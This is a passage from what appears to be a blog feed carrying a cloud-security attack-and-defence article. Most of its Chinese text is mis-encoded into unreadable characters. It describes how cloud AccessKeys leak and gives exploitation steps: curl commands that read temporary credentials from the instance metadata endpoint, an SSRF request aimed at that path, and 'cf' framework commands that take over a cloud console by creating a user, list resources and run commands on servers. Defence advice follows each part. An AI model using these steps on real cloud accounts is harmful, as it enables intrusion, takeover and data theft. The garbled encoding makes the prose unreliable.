keyå†™å…¥æ—¥å¿—æ–‡ä»¶ä¸­ï¼Œå¹¶ä¸”è¿™äº›æ—¥å¿—æ–‡ä»¶è¢«å…¬å¼€è®¿é—®æˆ–è€…è¢«æ”»å‡»è€…è·å–åˆ°ï¼Œé‚£ä¹ˆä»–ä»¬å¯ä»¥åˆ©ç”¨è¿™äº›ä¿¡æ¯è¿›è¡Œæœªç»æˆæƒè®¿é—®äº‘æœåŠ¡ã€‚</p><p>3.é…ç½®æ–‡ä»¶ï¼šå¦‚æœæ‚¨çš„åº”ç”¨ç¨‹åºæˆ–ç³»ç»Ÿé…ç½®æ–‡ä»¶ä¸­æ˜æ–‡å­˜å‚¨äº†äº‘æœåŠ¡access keyï¼Œå¹¶ä¸”è¿™äº›é…ç½®æ–‡ä»¶è¢«ä¸æ°å½“åœ°å…±äº«ã€å­˜å‚¨æˆ–ä¼ è¾“ï¼Œæ”»å‡»è€…ä¹Ÿå¯ä»¥é€šè¿‡è·å–è¿™äº›é…ç½®æ–‡ä»¶æ¥è·å–access keyã€‚</p><p>4.å¼€å‘ç¯å¢ƒå’Œæµ‹è¯•ç¯å¢ƒï¼šåœ¨å¼€å‘å’Œæµ‹è¯•ç¯å¢ƒä¸­ï¼Œé€šå¸¸éœ€è¦ä½¿ç”¨äº‘æœåŠ¡access keyæ¥è¿›è¡Œè°ƒè¯•å’Œæµ‹è¯•ã€‚å¦‚æœè¿™äº›ç¯å¢ƒæ²¡æœ‰å¾—åˆ°é€‚å½“çš„ä¿æŠ¤ï¼Œæ”»å‡»è€…å¯ä»¥è·å–åˆ°è¿™äº›æ•æ„Ÿä¿¡æ¯ã€‚</p><p>5.APP&#x2F;å°ç¨‹åºç¼–è¯‘æ‰“åŒ…æ—¶è¢«åµŒå…¥ï¼šåœ¨åº”ç”¨ç¨‹åºæˆ–å°ç¨‹åºçš„ç¼–è¯‘æ‰“åŒ…è¿‡ç¨‹ä¸­ï¼Œå¦‚æœaccess keyè¢«ä¸é€‚å½“åœ°åµŒå…¥åˆ°äºŒè¿›åˆ¶æ–‡ä»¶ã€APKæˆ–IPAä¸­ï¼Œæ”»å‡»è€…å¯ä»¥é€šè¿‡è§£æè¿™äº›æ–‡ä»¶æ¥è·å–access keyã€‚ï¼ˆæ”»å‡»è€…é€šè¿‡ Charles æŠ“åŒ…è·å– API è¯·æ±‚ä¸­çš„ AccessKeyï¼Œæˆ–åç¼–è¯‘ APK æ–‡ä»¶æå–ç¡¬ç¼–ç å‡­è¯ï¼‰ã€‚</p><p>6.ç¬¬ä¸‰æ–¹åº”ç”¨ç¨‹åºï¼šå¦‚æœæ‚¨ä½¿ç”¨äº†ç¬¬ä¸‰æ–¹åº”ç”¨ç¨‹åºæˆ–æœåŠ¡æ¥ç®¡ç†å’Œç›‘æ§äº‘æœåŠ¡ï¼Œè¿™äº›åº”ç”¨ç¨‹åºå¯èƒ½ä¼šè¦æ±‚æ‚¨æä¾›äº‘æœåŠ¡access keyï¼Œå¦‚&#x2F;actuator&#x2F;heapdumpã€‚å¦‚æœè¿™äº›åº”ç”¨ç¨‹åºæ²¡æœ‰å¾—åˆ°é€‚å½“çš„ä¿æŠ¤æˆ–è€…å­˜åœ¨å®‰å…¨æ¼æ´ï¼Œæ”»å‡»è€…å¯ä»¥é€šè¿‡æ”»å‡»è¿™äº›åº”ç”¨ç¨‹åºè·å–åˆ°äº‘æœåŠ¡access keyã€‚</p><p>7.å‰ç«¯æ–‡ä»¶ï¼šå½“å‰ç«¯å¼€å‘äººå‘˜åœ¨ç¼–å†™ä»£ç æ—¶ï¼Œå¯èƒ½ä¼šå°†åŒ…å«AccessKeyçš„å¯†é’¥æˆ–å‡­è¯ç›´æ¥ç¡¬ç¼–ç åˆ°å‰ç«¯æ–‡ä»¶ï¼ˆå¦‚HTMLã€JSæ–‡ä»¶ï¼‰ä¸­ï¼Œè¿™æ ·åœ¨å‰ç«¯ä»£ç æ‰§è¡Œæ—¶å°±å¯ä»¥ç›´æ¥è·å–åˆ°AccessKeyï¼Œå¹¶ç”¨äºä¸äº‘æœåŠ¡è¿›è¡Œäº¤äº’ã€‚ç„¶è€Œï¼Œä¸€æ—¦è¿™äº›æ–‡ä»¶è¢«å­˜å‚¨åœ¨å…¬å¼€çš„ä½ç½®æˆ–æœªå—ä¿æŠ¤çš„æœåŠ¡å™¨ä¸Šï¼Œæ”»å‡»è€…å°±æœ‰å¯èƒ½è·å–åˆ°è¿™äº›æ–‡ä»¶ï¼Œå¹¶çªƒå–AccessKeyã€‚</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/41757c7570d04885b4f7f4f361231225.png" alt="img"></p><p>8.é‚®ä»¶ &#x2F; èŠå¤©è®°å½•æ³„éœ²ï¼ˆè¿ç»´äººå‘˜åœ¨æ²Ÿé€šä¸­è¯¯å‘ AccessKeyï¼‰ã€‚</p><h4 id="å¦‚ä½•å‘ç°"><a href="#å¦‚ä½•å‘ç°" class="headerlink" title="å¦‚ä½•å‘ç°"></a>å¦‚ä½•å‘ç°</h4><p>ä½œä¸ºå®‰å…¨æµ‹è¯•è€…ï¼Œæˆ‘ä»¬å¦‚ä½•æŒ–æ˜è¯¥å®‰å…¨é—®é¢˜</p><p>è¿™é‡Œæ¨èä¸€ç¯‡æ–‡ç« ï¼šAccessKey ç‰¹å¾æ•´ç† | T Wiki <a href="https://wiki.teamssix.com/cloudservice/more/">https://wiki.teamssix.com/cloudservice/more/</a></p><p>Burpsuiteæ’ä»¶HaEï¼šGitHub - gh0stkey&#x2F;HaE: HaE - Highlighter and Extractor, Empower ethical hacker for efficient operations.<a href="https://gitcode.com/gh_mirrors/ha/HaE?utm_source=csdn_github_accelerator&isLogin=1">https://gitcode.com/gh_mirrors/ha/HaE?utm_source=csdn_github_accelerator&amp;isLogin=1</a></p><h4 id="å®æˆ˜åˆ©ç”¨æ–¹æ³•"><a href="#å®æˆ˜åˆ©ç”¨æ–¹æ³•" class="headerlink" title="å®æˆ˜åˆ©ç”¨æ–¹æ³•"></a>å®æˆ˜åˆ©ç”¨æ–¹æ³•</h4><ol><li><strong>å·¥å…·é€‰æ‹©</strong>ï¼š</li></ol><ul><li><p>å›¾å½¢åŒ–å·¥å…·ï¼šOSS Browserï¼ˆé˜¿é‡Œäº‘ï¼‰ã€COS Browserï¼ˆè…¾è®¯äº‘ï¼‰ã€S3 Browserï¼ˆAWS S3ï¼‰ï¼›</p></li><li><p>å‘½ä»¤è¡Œå·¥å…·ï¼šé˜¿é‡Œäº‘ CLIï¼ˆ<code>aliyun oss ls</code>ï¼‰ã€è…¾è®¯äº‘ CLIï¼ˆ<code>tccli cos ls</code>ï¼‰ã€AWS CLIï¼ˆ<code>aws s3 ls</code>ï¼‰ï¼›  </p></li><li><p>æ¸—é€æ¡†æ¶ï¼šCFï¼ˆCloud Exploit Frameworkï¼Œæ”¯æŒå¤šå‚å•†èµ„æºç®¡ç†ï¼‰ã€‚</p></li><li><p><a href="https://github.com/wgpsec/cloudsword">https://github.com/wgpsec/cloudsword</a> </p></li><li><p><a href="https://github.com/wgpsec/cloudsword/blob/master/static/1201_aliyun_oss_list_buckets.gif">https://github.com/wgpsec/cloudsword/blob/master/static/1201_aliyun_oss_list_buckets.gif</a></p></li><li><p>äº‘é‰´ CloudSword æ˜¯ä¸€æ¬¾å¸®åŠ©å…¬æœ‰äº‘ç§Ÿæˆ·å¿«é€Ÿå‘ç°äº‘ä¸Šé£é™©ã€æµ‹è¯•äº‘ä¸Šé£é™©ã€å¢å¼ºäº‘ä¸Šé˜²æŠ¤èƒ½åŠ›çš„ç»¼åˆæ€§å¼€æºå·¥å…·ã€‚</p></li></ul><ol><li><strong>åˆ©ç”¨æ­¥éª¤ï¼ˆä»¥é˜¿é‡Œäº‘ OSS ä¸ºä¾‹ï¼‰</strong>ï¼š</li></ol><ul><li><p>æ­¥éª¤ 1ï¼šåœ¨ OSS Browser ä¸­é…ç½®æ³„éœ²çš„ AccessKeyID å’Œ AccessKeySecretï¼Œé€‰æ‹©å¯¹åº”çš„åœ°åŸŸï¼›</p></li><li><p>æ­¥éª¤ 2ï¼šè¿æ¥æˆåŠŸåï¼Œå¯æŸ¥çœ‹ Bucket åˆ—è¡¨ã€ä¸‹è½½æ•æ„Ÿæ–‡ä»¶ï¼ˆå¦‚æ•°æ®åº“å¤‡ä»½ã€ç”¨æˆ·æ•°æ®ï¼‰ã€ä¸Šä¼ æ¶æ„æ–‡ä»¶ï¼›</p></li><li><p>æ­¥éª¤ 3ï¼šè‹¥ AccessKey æƒé™è¶³å¤Ÿï¼ˆå¦‚æ‹¥æœ‰<code>AliyunOSSFullAccess</code>æƒé™ï¼‰ï¼Œå¯ä¿®æ”¹ Bucket ACL ä¸º â€œå…¬å…±è¯»å†™â€ï¼Œæ‰©å¤§æ”»å‡»èŒƒå›´ï¼›  </p></li><li><p>è¿›é˜¶åˆ©ç”¨ï¼šé€šè¿‡ AccessKey è°ƒç”¨äº‘å‚å•† APIï¼Œè·å– ECS å®ä¾‹åˆ—è¡¨ã€RDS æ•°æ®åº“åœ°å€ç­‰ä¿¡æ¯ï¼Œè¿›è¡Œæ¨ªå‘æ¸—é€ã€‚</p></li></ul><h4 id="é˜²å¾¡å»ºè®®"><a href="#é˜²å¾¡å»ºè®®" class="headerlink" title="é˜²å¾¡å»ºè®®"></a>é˜²å¾¡å»ºè®®</h4><p>æƒé™æœ€å°åŒ–ï¼šä½¿ç”¨ RAM å­è´¦æˆ·åˆ›å»º AccessKeyï¼Œä»…æˆäºˆå¿…è¦æƒé™ï¼ˆå¦‚ä»…å…è®¸ â€œOSS åªè¯»â€ï¼Œä¸å…è®¸ â€œECS ç®¡ç†â€ï¼‰ï¼›</p><p>å®šæœŸè½®æ¢ï¼šæ¯ 3 ä¸ªæœˆæ›´æ¢ä¸€æ¬¡ AccessKeyï¼Œåˆ é™¤è¿‡æœŸæˆ–æ— ç”¨çš„ AccessKeyï¼›</p><p>æ³„éœ²æ£€æµ‹ï¼šå¼€å¯äº‘å‚å•†å®‰å…¨ä¸­å¿ƒçš„ â€œAccessKey æ³„éœ²æ£€æµ‹â€ åŠŸèƒ½ï¼ˆå¦‚é˜¿é‡Œäº‘å®‰å…¨ä¸­å¿ƒã€è…¾è®¯äº‘å¨èƒæƒ…æŠ¥ï¼‰ï¼ŒåŠæ—¶å‘ç°æ³„éœ²å¹¶å‘Šè­¦ï¼› </p><p>é¿å…å‰ç«¯æš´éœ²ï¼šå‰ç«¯ç›´ä¼  OSS æ—¶ï¼Œä½¿ç”¨ â€œä¸´æ—¶ AccessKeyâ€ï¼ˆé€šè¿‡åç«¯ API åŠ¨æ€ç”Ÿæˆï¼Œæœ‰æ•ˆæœŸçŸ­ï¼Œæƒé™å—é™ï¼‰ï¼Œè€Œéæ°¸ä¹… AccessKeyã€‚</p><h1 id="äº‘æœåŠ¡æ”»é˜²-å¼¹æ€§è®¡ç®—æœåŠ¡å®‰å…¨"><a href="#äº‘æœåŠ¡æ”»é˜²-å¼¹æ€§è®¡ç®—æœåŠ¡å®‰å…¨" class="headerlink" title="äº‘æœåŠ¡æ”»é˜²-å¼¹æ€§è®¡ç®—æœåŠ¡å®‰å…¨"></a>äº‘æœåŠ¡æ”»é˜²-å¼¹æ€§è®¡ç®—æœåŠ¡å®‰å…¨</h1><h2 id="æœåŠ¡å®šä¹‰ä¸å‘½å"><a href="#æœåŠ¡å®šä¹‰ä¸å‘½å" class="headerlink" title="æœåŠ¡å®šä¹‰ä¸å‘½å"></a>æœåŠ¡å®šä¹‰ä¸å‘½å</h2><p><strong>å®šä¹‰</strong>ï¼šäº‘ä¸Šçš„è™šæ‹ŸåŒ–æœåŠ¡å™¨ï¼ˆè™šæ‹Ÿæœºï¼‰ï¼Œç”¨æˆ·å¯è‡ªå®šä¹‰ CPUã€å†…å­˜ã€ç¡¬ç›˜ã€æ“ä½œç³»ç»Ÿç­‰é…ç½®ï¼Œç”¨äºéƒ¨ç½² Web åº”ç”¨ã€æ•°æ®åº“ã€ä¸­é—´ä»¶ç­‰ä¸šåŠ¡ã€‚ä¸ä¼ ç»Ÿç‰©ç†æœåŠ¡å™¨ç›¸æ¯”ï¼Œæ”¯æŒåˆ†é’Ÿçº§åˆ›å»º &#x2F; é”€æ¯ï¼Œå¯é€šè¿‡ â€œå¼¹æ€§ä¼¸ç¼©â€ æ ¹æ®ä¸šåŠ¡è´Ÿè½½è‡ªåŠ¨å¢å‡å®ä¾‹æ•°é‡ã€‚<br><strong>å„å‚å•†äº§å“å‘½å</strong>ï¼š </p><table><thead><tr><th>äº‘å‚å•†</th><th>äº§å“åç§°</th><th>æ ¸å¿ƒç‰¹æ€§</th></tr></thead><tbody><tr><td>é˜¿é‡Œäº‘</td><td>ECS</td><td>æ”¯æŒçªå‘æ€§èƒ½å®ä¾‹ã€GPU å®ä¾‹ã€å¼¹æ€§è£¸é‡‘å±æœåŠ¡å™¨ï¼Œé€‚é…é˜¿é‡Œäº‘ç”Ÿæ€ï¼ˆå¦‚ RDSã€OSSï¼‰</td></tr><tr><td>è…¾è®¯äº‘</td><td>CVM</td><td>é›†æˆè…¾è®¯äº‘å®‰å…¨ç»„ã€äº‘é•œï¼ˆä¸»æœºå®‰å…¨ï¼‰ã€è´Ÿè½½å‡è¡¡ï¼Œé€‚åˆæ¸¸æˆã€ç›´æ’­åœºæ™¯</td></tr><tr><td>åä¸ºäº‘</td><td>ECS</td><td>åŸºäºé²²é¹èŠ¯ç‰‡çš„ ARM æ¶æ„å®ä¾‹ï¼Œæ”¯æŒæ¬§æ‹‰æ“ä½œç³»ç»Ÿï¼Œä¾§é‡ä¼ä¸šçº§ç¨³å®šæ€§</td></tr><tr><td>è°·æ­Œäº‘</td><td>GCE</td><td>ä¸è°·æ­Œäº‘ Kubernetes Engineï¼ˆGKEï¼‰æ·±åº¦é›†æˆï¼Œé€‚åˆå®¹å™¨åŒ–éƒ¨ç½²</td></tr><tr><td>å¾®è½¯äº‘ï¼ˆAzureï¼‰</td><td>VM</td><td>æ”¯æŒ Windows Serverã€Linux ç³»ç»Ÿï¼Œä¸ Azure Active Directoryã€Office 365 è”åŠ¨</td></tr><tr><td>äºšé©¬é€Šäº‘ï¼ˆAWSï¼‰</td><td>EC2</td><td>è¡Œä¸šæ ‡æ†ï¼Œæ”¯æŒ Spot å®ä¾‹ï¼ˆä½ä»·é—²ç½®èµ„æºï¼‰ã€Auto Scalingï¼ˆå¼¹æ€§ä¼¸ç¼©ï¼‰</td></tr></tbody></table><h2 id="æ ¸å¿ƒé£é™©ï¼šå…ƒæ•°æ®æ³„éœ²ä¸-SSRF-ç»“åˆ"><a href="#æ ¸å¿ƒé£é™©ï¼šå…ƒæ•°æ®æ³„éœ²ä¸-SSRF-ç»“åˆ" class="headerlink" title="æ ¸å¿ƒé£é™©ï¼šå…ƒæ•°æ®æ³„éœ²ä¸ SSRF ç»“åˆ"></a>æ ¸å¿ƒé£é™©ï¼šå…ƒæ•°æ®æ³„éœ²ä¸ SSRF ç»“åˆ</h2><h3 id="å…ƒæ•°æ®ï¼ˆInstance-Metadataï¼‰å®šä¹‰"><a href="#å…ƒæ•°æ®ï¼ˆInstance-Metadataï¼‰å®šä¹‰" class="headerlink" title="å…ƒæ•°æ®ï¼ˆInstance Metadataï¼‰å®šä¹‰"></a>å…ƒæ•°æ®ï¼ˆInstance Metadataï¼‰å®šä¹‰</h3><p>å®ä¾‹å…ƒæ•°æ®æ˜¯äº‘å‚å•†ä¸º ECS&#x2F;CVM å®ä¾‹ç”Ÿæˆçš„åŠ¨æ€ä¿¡æ¯ï¼ŒåŒ…å«å®ä¾‹çš„åŸºæœ¬é…ç½®ï¼ˆå¦‚å®ä¾‹ IDã€å†…ç½‘ IPã€æ“ä½œç³»ç»Ÿç±»å‹ï¼‰ã€IAM è§’è‰²ä¸´æ—¶å‡­è¯ï¼ˆå¦‚ä¸´æ—¶ AccessKeyï¼‰ç­‰ã€‚ç”¨æˆ·å¯åœ¨å®ä¾‹å†…éƒ¨é€šè¿‡å›ºå®šåœ°å€è®¿é—®å…ƒæ•°æ®ï¼Œæ— éœ€è®¤è¯ï¼ˆé»˜è®¤ä»…å…è®¸å®ä¾‹å†…éƒ¨è®¿é—®ï¼‰ã€‚</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/20250914103834314.png" alt="image.png"> </p><p><strong>å„å‚å•†å…ƒæ•°æ®åœ°å€</strong>ï¼š </p><table><thead><tr><th>äº‘å‚å•†</th><th>å…ƒæ•°æ®è®¿é—®åœ°å€</th><th>ä¸´æ—¶å‡­è¯è·¯å¾„ï¼ˆIAM è§’è‰²ï¼‰</th></tr></thead><tbody><tr><td>é˜¿é‡Œäº‘</td><td><code>http://100.100.100.200/latest/meta-data/</code></td><td><code>/latest/meta-data/ram/security-credentials/è§’è‰²å</code></td></tr><tr><td>è…¾è®¯äº‘</td><td><code>http://169.254.0.23/latest/meta-data/</code></td><td><code>/latest/meta-data/cam/security-credentials/è§’è‰²å</code></td></tr><tr><td>åä¸ºäº‘</td><td><code>http://169.254.169.254/latest/meta-data/</code></td><td><code>/latest/meta-data/iam/security-credentials/è§’è‰²å</code></td></tr><tr><td>AWS</td><td><code>http://169.254.169.254/latest/meta-data/</code></td><td><code>/latest/meta-data/iam/security-credentials/è§’è‰²å</code></td></tr></tbody></table><h3 id="æ¼æ´åŸç†ï¼šSSRF-å…ƒæ•°æ®æ³„éœ²"><a href="#æ¼æ´åŸç†ï¼šSSRF-å…ƒæ•°æ®æ³„éœ²" class="headerlink" title="æ¼æ´åŸç†ï¼šSSRF + å…ƒæ•°æ®æ³„éœ²"></a>æ¼æ´åŸç†ï¼šSSRF + å…ƒæ•°æ®æ³„éœ²</h3><p>è‹¥ ECS å®ä¾‹ä¸Šéƒ¨ç½²çš„ Web åº”ç”¨å­˜åœ¨ SSRFï¼ˆæœåŠ¡å™¨ç«¯è¯·æ±‚ä¼ªé€ ï¼‰æ¼æ´ï¼Œæ”»å‡»è€…å¯æ„é€ è¯·æ±‚ï¼Œè®© Web åº”ç”¨ï¼ˆè¿è¡Œåœ¨å®ä¾‹å†…éƒ¨ï¼‰è®¿é—®å…ƒæ•°æ®åœ°å€ï¼Œè·å–ä¸´æ—¶ AccessKeyã€‚ç”±äºä¸´æ—¶ AccessKey æ‹¥æœ‰ IAM è§’è‰²çš„æƒé™ï¼Œæ”»å‡»è€…å¯åˆ©ç”¨è¯¥å‡­è¯æ“ä½œäº‘èµ„æºï¼Œå®ç°æ¨ªå‘æ¸—é€ã€‚</p><h3 id="å®æˆ˜åˆ©ç”¨åœºæ™¯ä¸æ­¥éª¤"><a href="#å®æˆ˜åˆ©ç”¨åœºæ™¯ä¸æ­¥éª¤" class="headerlink" title="å®æˆ˜åˆ©ç”¨åœºæ™¯ä¸æ­¥éª¤"></a>å®æˆ˜åˆ©ç”¨åœºæ™¯ä¸æ­¥éª¤</h3><h4 id="åœºæ™¯-1ï¼šè·å–-ECS-æƒé™åæ¨ªå‘ç§»åŠ¨"><a href="#åœºæ™¯-1ï¼šè·å–-ECS-æƒé™åæ¨ªå‘ç§»åŠ¨" class="headerlink" title="åœºæ™¯ 1ï¼šè·å– ECS æƒé™åæ¨ªå‘ç§»åŠ¨"></a>åœºæ™¯ 1ï¼šè·å– ECS æƒé™åæ¨ªå‘ç§»åŠ¨</h4><ul><li><p>å‰æï¼šæ”»å‡»è€…å·²é€šè¿‡ Web æ¼æ´ï¼ˆå¦‚ Webshellï¼‰è·å– ECS å®ä¾‹çš„ shell æƒé™ï¼›</p></li><li><p>åˆ©ç”¨æ­¥éª¤ï¼š  æ‰§è¡Œå‘½ä»¤è®¿é—®å…ƒæ•°æ®åœ°å€ï¼Œè·å–å…³é”®ä¿¡æ¯ï¼š</p></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http://100.100.100.200/latest/meta-data/</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/20250914104140832.png" alt="image.png"></p><p> è·å–ä¸´æ—¶å‡­æ® </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http://100.100.100.200/latest/meta-data/ram/security-credentials/ecs</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/20250914104155435.png" alt="image.png"></p><p>ä½¿ç”¨ CF æ¡†æ¶é…ç½®ä¸´æ—¶å‡­è¯ï¼Œæ¥ç®¡äº‘èµ„æºï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">cf config  <span class="comment"># è¾“å…¥AccessKeyIdã€AccessKeySecretã€SecurityTokenã€äº‘å‚å•†ï¼ˆå¦‚alibabaï¼‰</span></span><br><span class="line">cf alibaba perm  <span class="comment"># æŸ¥çœ‹å½“å‰å‡­è¯çš„æƒé™èŒƒå›´</span></span><br><span class="line">cf alibaba console  //ä¸€é”®æ¥ç®¡æ§åˆ¶å°</span><br><span class="line">æ¥ç®¡æ§åˆ¶å°çš„æ—¶å€™é»˜è®¤ä¼šåˆ›å»ºä¸€ä¸ªåç§°ä¸º crossfire çš„ç”¨æˆ·ï¼Œå¦‚æœæƒ³æ”¹æˆå…¶ä»–ç”¨æˆ·åå¯ä»¥ä½¿ç”¨ -u å‚æ•°</span><br><span class="line">cf alibaba console -u lalala</span><br><span class="line">ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤åˆ—å‡ºå½“å‰å‡­è¯æƒé™ä»¥åŠå¯ä»¥æ‰§è¡Œçš„æ“ä½œ</span><br><span class="line">cf alibaba perm  // ä¸€é”®åˆ—å‡ºé˜¿é‡Œäº‘çš„å‡­è¯æƒé™</span><br><span class="line">cf tencent perm  // ä¸€é”®åˆ—å‡ºè…¾è®¯äº‘çš„å‡­è¯æƒé™</span><br><span class="line">cf huawei perm  // ä¸€é”®åˆ—å‡ºåä¸ºäº‘çš„å‡­è¯æƒé™</span><br><span class="line">cf alibaba oss <span class="built_in">ls</span>  åˆ—å‡ºOSSèµ„æº</span><br><span class="line">cf alibaba ecss <span class="built_in">ls</span>  åˆ—å‡ºECSèµ„æº</span><br><span class="line">cf alibaba ecs <span class="built_in">exec</span>    åœ¨ECSä¸Šæ‰§è¡Œå‘½ä»¤</span><br><span class="line">cf alibaba rds <span class="built_in">ls</span>    åˆ—å‡ºRDSèµ„æº</span><br><span class="line">cf alibaba oss obj get     ä¸‹è½½å­˜å‚¨æ¡¶é‡Œçš„å¯¹è±¡</span><br><span class="line">cf alibaba oss obj get -b bucketName  æŒ‡å®šå­˜å‚¨æ¡¶</span><br><span class="line">cf alibaba oss obj get -b bucketName -k objectName æŒ‡å®šå­˜å‚¨æ¡¶ä»¥åŠå¯¹è±¡</span><br><span class="line">cf alibaba oss obj get -o ./result   ä¿å­˜åˆ°æŒ‡å®šç›®å½•</span><br><span class="line">å…·ä½“cfä½¿ç”¨å‘½ä»¤å¯ä»¥å‚è€ƒï¼šhttps://wiki.teamssix.com/cf/</span><br></pre></td></tr></table></figure><h4 id="åœºæ™¯-2ï¼šé€šè¿‡-SSRF-æ¼æ´è·å–ä¸´æ—¶-AK"><a href="#åœºæ™¯-2ï¼šé€šè¿‡-SSRF-æ¼æ´è·å–ä¸´æ—¶-AK" class="headerlink" title="åœºæ™¯ 2ï¼šé€šè¿‡ SSRF æ¼æ´è·å–ä¸´æ—¶ AK"></a>åœºæ™¯ 2ï¼šé€šè¿‡ SSRF æ¼æ´è·å–ä¸´æ—¶ AK</h4><ul><li><p>å‰æï¼šWeb åº”ç”¨å­˜åœ¨ SSRF æ¼æ´ï¼ˆå¦‚å…è®¸ç”¨æˆ·è¾“å…¥ URL å¹¶ç”±æœåŠ¡å™¨å‘èµ·è¯·æ±‚ï¼‰ï¼›</p></li><li><p>åˆ©ç”¨æ­¥éª¤ï¼š</p></li></ul><ol><li>æ„é€  SSRF è¯·æ±‚ï¼Œè®¿é—®å…ƒæ•°æ®çš„ä¸´æ—¶å‡­è¯è·¯å¾„ï¼ˆä»¥é˜¿é‡Œäº‘ä¸ºä¾‹ï¼‰ï¼š</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># å‡è®¾Webåº”ç”¨çš„SSRFæ¥å£ä¸ºhttp://target.com/ssrf?url=xxx</span><br><span class="line">æ„é€ è¯·æ±‚ï¼šhttp://target.com/ssrf?url=http://100.100.100.200/latest/meta-data/ram/security-credentials/ecs-admin</span><br></pre></td></tr></table></figure><ol><li><p>è‹¥ SSRF æ¼æ´å¯å›æ˜¾ç»“æœï¼Œæ”»å‡»è€…å¯ç›´æ¥è·å–ä¸´æ—¶ AccessKeyï¼›</p></li><li><p>è‹¥ä¸å¯å›æ˜¾ï¼Œå¯å°†ä¸´æ—¶ AK å‘é€è‡³æ”»å‡»è€…æ§åˆ¶çš„æœåŠ¡å™¨ï¼ˆå¦‚é€šè¿‡ DNSlog æˆ– HTTP è¯·æ±‚å¤–å¸¦ï¼‰ï¼›</p></li></ol><h2 id="é˜²å¾¡å»ºè®®ï¼š"><a href="#é˜²å¾¡å»ºè®®ï¼š" class="headerlink" title="é˜²å¾¡å»ºè®®ï¼š"></a>é˜²å¾¡å»ºè®®ï¼š</h2><p>é™åˆ¶ ECS å®ä¾‹å…ƒæ•°æ®çš„è®¿é—®èŒƒå›´ï¼ˆéƒ¨åˆ†äº‘å‚å•†æ”¯æŒï¼Œå¦‚ AWS å¯é€šè¿‡ IAM ç­–ç•¥ç¦æ­¢ç‰¹å®šè§’è‰²è®¿é—®å…ƒæ•°æ®ï¼‰ï¼›</p><p>ä¿®å¤ Web åº”ç”¨çš„ SSRF æ¼æ´ï¼Œç¦æ­¢è¯·æ±‚å†…ç½‘åœ°å€ï¼ˆå¦‚<code>100.100.100.0/24</code>ã€<code>169.254.0.0/16</code>ï¼‰ï¼›</p><p>ä¸º IAM è§’è‰²é…ç½®æœ€å°æƒé™ï¼Œé¿å…ä¸´æ—¶ AK æ³„éœ²åå¯¼è‡´å¤§è§„æ¨¡èµ„æºè¢«æ§åˆ¶ã€‚</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;äº‘æœåŠ¡åŸºç¡€ä»‹ç»&quot;&gt;&lt;a href=&quot;#äº‘æœåŠ¡åŸºç¡€ä»‹ç»&quot; class=&quot;headerlink&quot; title=&quot;äº‘æœåŠ¡åŸºç¡€ä»‹ç»&quot;&gt;&lt;/a&gt;äº‘æœåŠ¡åŸºç¡€ä»‹ç»&lt;/h1&gt;&lt;p&gt;äº‘æœåŠ¡ï¼Œé¡¾åæ€ä¹‰å°±æ˜¯äº‘ä¸ŠæœåŠ¡ï¼Œåœ¨äº‘å‚å•†ä¸Šè´­ä¹°çš„äº§å“æœåŠ¡ã€‚å›½å†…æœ‰é˜¿é‡Œäº‘ã€è…¾è®¯äº‘ã€åä¸ºäº‘ã€å¤©ç¿¼äº‘ã€Ucl</summary>
      
    
    
    
    <category term="äº‘å®‰å…¨" scheme="https://250wuyifan.github.io/categories/%E4%BA%91%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="äº‘å®‰å…¨" scheme="https://250wuyifan.github.io/tags/%E4%BA%91%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>è®ºæ–‡æœŸåˆŠæŠ•ç¨¿æµç¨‹å­¦ä¹ ç¬”è®°</title>
    <link href="https://250wuyifan.github.io/2025/09/09/%E8%AE%BA%E6%96%87%E6%9C%9F%E5%88%8A%E6%8A%95%E7%A8%BF%E6%B5%81%E7%A8%8B%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    <id>https://250wuyifan.github.io/2025/09/09/%E8%AE%BA%E6%96%87%E6%9C%9F%E5%88%8A%E6%8A%95%E7%A8%BF%E6%B5%81%E7%A8%8B%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</id>
    <published>2025-09-09T07:14:18.000Z</published>
    <updated>2025-09-09T09:44:17.207Z</updated>
    
